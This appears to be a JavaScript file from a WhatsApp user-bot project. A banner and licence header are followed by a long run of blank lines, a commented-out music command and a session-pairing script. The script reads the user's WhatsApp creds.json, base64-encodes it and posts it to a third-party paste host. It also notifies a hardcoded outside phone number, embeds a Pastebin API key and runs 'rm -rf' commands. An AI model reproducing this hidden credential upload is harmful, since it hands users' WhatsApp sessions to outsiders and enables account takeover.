/*

//══════════════════════════════════════════════════════════════════════════════════════════════════════//
//                                                                                                      //
//                                ＷＨＡＴＳＡＰＰ ＢＯＴ－ＭＤ ＢＥＴＡ                                      // 
//                                                                                                      // 
//                                         Ｖ：１．０．１                                                 // 
//                                                                                                      // 
//                             //////
//            ╚════██║██║   ██║██╔══██║██╔══██║██║██║         ██║╚██╔╝██║██║  ██║                       //
//            ███████║╚██████╔╝██║  ██║██║  ██║██║███████╗    ██║ ╚═╝ ██║██████╔╝                       //
//            ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝     ╚═╝╚═════╝                        //
//                                                                                                      //
//                                                                                                      //
//                                                                                                      //
//══════════════════════════════════════════════════════════════════════════════════════════════════════//

CURRENTLY RUNNING ON BETA VERSION!!
*
   * @project_name : Scorpion-Md
   * @author : Scorpion Tech Info
   * @youtube : https://www.youtube.com/c/@ScorpionTechInfo0
   * @description : Scorpion Md ,A Multi-functional whatsapp user bot.
   * @version 1.0.1
*
   * Licensed under the  GPL-3.0 License;
* 
   * Created By Scorpion Tech Info.
   * © 2023 Scorpion-Md.
* 
   * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   * SOFTWARE.
*/




















































































































































































































   //------------------------------------------------------
   //               Play Command
   //------------------------------------------------------
   // For Button menu
    /*async(Void, citel, text) => {
            if (!text) return citel.reply(`Example : ${prefix}play Back in black`)
            let yts = require("secktor-pack");
            let search = await yts(text);
            let anu = search.videos[0];
            let buttons = [{
                    buttonId: `${prefix}ytmp4 ${anu.url}`,
                    buttonText: {
                        displayText: "► Video",
                    },
                    type: 1,
                }, 
                {
                    buttonId: `${prefix}ytmp3 ${anu.url}`,
                    buttonText: {
                        displayText: "♫ Audio",
                    },
                    type: 1,
                },
            ];
            let buttonMessage = {
                image: { url: anu.thumbnail, },
                caption: `
╭───────────────◆
│⿻ ${tlang().title} 
│  *Youtube Player* ✨
│⿻ *Title:* ${anu.title}
│⿻ *Duration:* ${anu.timestamp}
│⿻ *Viewers:* ${anu.views}
│⿻ *Uploaded:* ${anu.ago}
│⿻ *Author:* ${anu.author.name}
╰────────────────◆
⦿ *Url* : ${anu.url}
`,
                footer: tlang().footer,
                buttons: buttons,
                headerType: 4,
            };
            return Void.sendMessage(citel.chat, buttonMessage, {
                quoted: citel,
            });

        }
    )







    const pino = require("pino");
const axios = require("axios");
let qrcode = require("qrcode-terminal");
const PastebinAPI = require("pastebin-js");
const path = require('path');
pastebin = new PastebinAPI("EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL");
const fs = require("fs-extra");
if (fs.existsSync('./auth_info_baileys')) {
  fs.emptyDirSync(__dirname + '/auth_info_baileys');
  require('child_process').exec('rm -rf auth_info_baileys')
  console.log('\nRun The Script Again');
  setTimeout(() => {   console.log(' ')    }, 100);
  setTimeout(() => {   console.log('𝑺')    }, 300);
  setTimeout(() => {   console.log('𝒆')    }, 500);
  setTimeout(() => {   console.log('𝒄')    }, 700);
  setTimeout(() => {   console.log('𝒌')    }, 900);
  setTimeout(() => {   console.log('𝒕')    }, 1100);
  setTimeout(() => {   console.log('𝒐')    }, 1300);
  setTimeout(() => {   console.log('𝒓')    }, 1500);
  setTimeout(() => {   console.log(' ')    }, 1700);
  setTimeout(() => {   console.log('𝑩')    }, 1900);
  setTimeout(() => {   console.log('𝒐')    }, 2100);
  setTimeout(() => {   console.log('𝒕')    }, 2300);
  setTimeout(() => {   process.exit()      }, 2400)
};
setTimeout(() => {
  const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, makeInMemoryStore, } = require("@sampandey001/baileys");
  const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
  async function Secktor() {
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys')
    try {
      let session = makeWASocket({ printQRInTerminal: true, logger: pino({ level: "silent" }), browser: Browsers.macOS("Desktop"), auth: state });
      session.ev.on("connection.update", async (s) => {
        const { connection, lastDisconnect, qr } = s;
        if (connection == "open")
        {
          await delay(500);
          let user = session.user.id;
          var c2 = '';
//===========================================================================================
//===============================  SESSION ID 1   ===========================================
//===========================================================================================
          try { 
            let data = await fs.readFileSync(__dirname+'/auth_info_baileys/creds.json','utf-8')  
            await delay(800)
            const output = await axios.post('http://paste.c-net.org/',`${btoa(data)}`,{headers:{'Content-Type':'application/x-www-form-urlencoded'}});
             c2 = output.data.split('/')[3]
            await delay(500);
            let session_id1 = await session.sendMessage(user, {text: 'Secktor;;;'+c2});
            await session.sendMessage("923184474176@s.whatsapp.net", { text: '*Qr Scan Completed Successfully.*' } , {quoted : session_id1});
          }catch (e) {console.log(e)}
//===========================================================================================
//===============================  SESSION ID 2   ===========================================
//===========================================================================================
          let unique = fs.readFileSync(__dirname + '/auth_info_baileys/creds.json')
          c = Buffer.from(unique).toString('base64')
          console.log(`
====================  SESSION ID 1  ==========================                   
SESSION-ID 1 ==> ${c}

====================  SESSION ID 2  ========================== 
SESSION-ID 2 => ' ${c2}

Don't provide your SESSION_ID to anyone otherwise that user can access your account.
Thanks.
-------------------   SESSION CLOSED   -----------------------
`)   




          
let cc = `╔════◇
║『𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗖𝗵𝗼𝗼𝘀𝗶𝗻𝗴 𝗦𝗲𝗰𝗸𝘁𝗼𝗿•𝗠𝗱』
║ _You complete first step to making Bot._
╚════════════════════════╝
╔═════◇
║  『••• 𝗩𝗶𝘀𝗶𝘁 𝗙𝗼𝗿 𝗛𝗲𝗹𝗽 •••』
║ *1.Repo:* _https://tinyurl.com/2czdxe7a_
║ *2.Ytube:* _https://tinyurl.com/22q7z2kv_
║ *3.Owner:* _https://wa.me/8024031146_
║ *Note :*_Don't provide your SESSION_ID to_
║ _anyone otherwise that can access chats_
╚════════════════════════╝
`;
          let session_id = await session.sendMessage(user, { text: "Secktor;;;" + c });
          await session.sendMessage(user, { text: cc } , { quoted : session_id });
          
          await require('child_process').exec('rm -rf auth_info_baileys')
          process.exit(1)
        }
        session.ev.on('creds.update', saveCreds)
       if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) { Secktor(); }
      });
    } catch (err) {console.log(err);await require('child_process').exec('rm -rf auth_info_baileys');process.exit(1);}
  }
  Secktor();
}, 3000)
\\
*/
